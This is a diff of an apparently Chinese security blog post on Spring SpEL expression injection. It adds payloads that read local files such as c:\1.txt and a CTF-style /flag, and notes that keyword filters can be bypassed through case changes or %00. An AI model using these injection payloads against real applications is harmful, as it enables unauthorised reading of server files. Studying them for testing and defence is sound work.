@@ -88,7 +88,7 @@
             <h1>Java spring SPEL表达式注入</h1>
             <span class="meta">
             	Posted on
-              2020-09-07，3 min read
+              2020-09-07，4 min read
             </span>
           </div>
         </div>
@@ -182,7 +182,8 @@ SPEL也支持</p>
 读文件<br>
 <code>#{new java.util.Scanner(new java.io.File(&quot;c:\\1.txt&quot;)).next()}</code><br>
 <code>#{T(org.apache.commons.io.FileUtils).readFileToString(new java.io.File(&quot;c:\\1.txt&quot;))}</code><br>
-<code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()</code><br>
+<code>#{NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()}</code><br>
+<code>#{New java.io.BufferedReader(New java.io.FileReader(&quot;/flag&quot;)).readLine()}</code><br>
 利用FileUtils这个包。不是自带的<br>
 当遇到过滤关键字的时候。可以利用大小写。%00等骚姿势绕过<br>
 在SPEL中。关键字不区分大小写。比如new/NEW</p>
